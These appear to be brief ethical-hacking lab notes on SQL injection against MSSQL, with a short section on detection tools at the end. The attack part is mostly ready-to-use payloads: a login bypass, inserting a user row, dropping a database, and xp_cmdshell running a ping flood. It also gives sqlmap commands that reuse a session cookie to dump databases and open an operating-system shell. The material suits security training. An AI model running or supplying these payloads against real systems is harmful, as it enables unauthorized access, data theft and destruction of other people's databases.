# SQL Injection

## SQL injection attacks

### Perform an SQL injection attack on an MSSQL database

* blah' or 1=1 -- 
* blah';insert into login values ('john','apple123'); -- 
* blah';create database mydatabase; -- 
* blah'; DROP DATABASE mydatabase; -- 
* blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; -- 


### Perform an SQL injection attack against MSSQL to extract databases using sqlmap

login into moviescope.com
view profile
inspect element and get document cookie

```
sqlmap -u "url" --cookie="cookie" --dbs
sqlmap -u "url" --cookie="cookie" -D database --tables
sqlmap -u "url" --cookie="cookie" -D database -T tablename --dump
sqlmap -u "url" --cookie="cookie" --os-shell
	hostname
	dir
	traklist
```

## Detect SQL injection vulnerabilities using various SQL injection detection tools

### Detect SQL injection vulnerabilities using DSSS

```
cd DSSS
python3 dsss.py
dsss.py -u "url" --cookie="cookie" 
```

### Detect SQL injection vulnerabilities using OWASP ZAP


Automated Scan
Attack
